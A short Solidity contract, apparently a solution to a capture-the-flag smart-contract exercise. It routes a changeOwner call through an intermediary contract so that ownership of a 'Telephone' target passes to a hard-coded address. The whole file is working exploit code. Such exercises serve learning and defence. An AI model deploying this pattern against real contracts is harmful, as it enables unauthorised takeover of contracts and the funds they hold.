// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public target;
    address public AttackAddress = 0x88Fd768BFDc265216CdD5F9d172d296B7114197A;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack() external {
        target.changeOwner(AttackAddress);
    }
}
